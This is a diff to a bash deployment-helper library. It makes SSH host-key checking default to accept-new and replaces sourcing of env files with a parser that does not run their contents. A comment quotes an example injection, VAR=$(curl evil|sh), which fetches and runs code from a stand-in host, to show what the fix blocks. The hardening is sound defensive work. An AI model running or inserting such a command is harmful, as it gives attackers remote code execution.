@@ -250,7 +250,7 @@ _get_mem_percent() {
     pages_active=$(echo "$vmstat" | awk '/Pages active:/{gsub(/\./,"",$3); print $3}')
     pages_speculative=$(echo "$vmstat" | awk '/Pages speculative:/{gsub(/\./,"",$3); print $3}')
     pages_wired=$(echo "$vmstat" | awk '/Pages wired down:/{gsub(/\./,"",$4); print $4}')
-    local used=$(( (pages_active + pages_wired + pages_speculative) ))
+    local used=$(( pages_active + pages_wired + pages_speculative ))
     if [ "$total_pages" -gt 0 ] 2>/dev/null; then
       echo $(( used * 100 / total_pages ))
     else
@@ -529,7 +529,10 @@ build_ssh_opts() {
     esac
   done
 
-  local opts="-o StrictHostKeyChecking=no -o ConnectTimeout=$timeout"
+  # Default to accept-new (TOFU: accept on first connect, reject on change).
+  # Override with STRUT_SSH_HOST_KEY_CHECK=no for legacy behavior.
+  local hk_mode="${STRUT_SSH_HOST_KEY_CHECK:-accept-new}"
+  local opts="-o StrictHostKeyChecking=$hk_mode -o ConnectTimeout=$timeout"
   [[ -n "$port" ]] && opts="-p $port $opts"
   [[ "$batch" == true ]] && opts="$opts -o BatchMode=yes"
   [[ "$tty" == true ]] && opts="-t $opts"
@@ -583,10 +586,63 @@ _env_not_found_hint() {
   return 0
 }
 
+# safe_load_env <env_file>
+#
+# Parses a KEY=VALUE env file without executing it (no `source`). This prevents
+# RCE via command substitution or shell expansion in env values (e.g.
+# VAR=$(curl evil|sh) would be executed by `source` but is harmless here).
+#
+# Supported syntax:
+#   KEY=value
+#   KEY="value with spaces"
+#   KEY='literal value'
+#   KEY=  (empty value)
+#   export KEY=value  (export prefix stripped)
+#   # comments and blank lines (ignored)
+#
+# Values are NOT shell-expanded — $FOO, $(cmd), and backticks are literal.
+# Exported into the current shell via `export`.
+safe_load_env() {
+  local env_file="$1"
+  local line key value
+
+  while IFS= read -r line || [ -n "$line" ]; do
+    # Strip leading/trailing whitespace
+    line="${line#"${line%%[![:space:]]*}"}"
+    line="${line%"${line##*[![:space:]]}"}"
+
+    # Skip blank lines and comments
+    [[ -z "$line" || "$line" == \#* ]] && continue
+
+    # Strip optional `export ` prefix
+    [[ "$line" == export\ * ]] && line="${line#export }"
+    [[ "$line" == export$'\t'* ]] && line="${line#export"$'\t'"}"
+
+    # Must contain = to be valid
+    [[ "$line" == *=* ]] || continue
+
+    key="${line%%=*}"
+    value="${line#*=}"
+
+    # Validate key: must be a valid shell identifier
+    [[ "$key" =~ ^[a-zA-Z_][a-zA-Z0-9_]*$ ]] || continue
+
+    # Strip surrounding quotes from value (single or double)
+    if [[ "${value:0:1}" == '"' && "${value: -1}" == '"' ]]; then
+      value="${value:1:${#value}-2}"
+    elif [[ "${value:0:1}" == "'" && "${value: -1}" == "'" ]]; then
+      value="${value:1:${#value}-2}"
+    fi
+
+    export "$key=$value"
+  done < "$env_file"
+}
+
 # validate_env_file <env_file> <required_var1> [required_var2] ...
 #
-# Sources the env file and validates that all listed variables are non-empty.
-# Fails with a clear message if the file is missing or a required var is empty.
+# Parses the env file safely (without executing) and validates that all listed
+# variables are non-empty. Fails with a clear message if the file is missing
+# or a required var is empty.
 #
 # Usage:
 #   validate_env_file "$ENV_FILE" VPS_HOST VPS_USER
@@ -605,7 +661,7 @@ $hint"
   # [stacks] mapping or an explicit --host override) so a global VPS_* defined
   # in the env file can't clobber the intended target when we re-source. (LA-223)
   local _vh="${VPS_HOST:-}" _vu="${VPS_USER:-}" _vp="${VPS_PORT:-}" _vk="${VPS_SSH_KEY:-}" _vd="${VPS_DEPLOY_DIR:-}"
-  set -a; source "$env_file"; set +a
+  safe_load_env "$env_file"
   [ -n "$_vh" ] && export VPS_HOST="$_vh"
   [ -n "$_vu" ] && export VPS_USER="$_vu"
   [ -n "$_vp" ] && export VPS_PORT="$_vp"
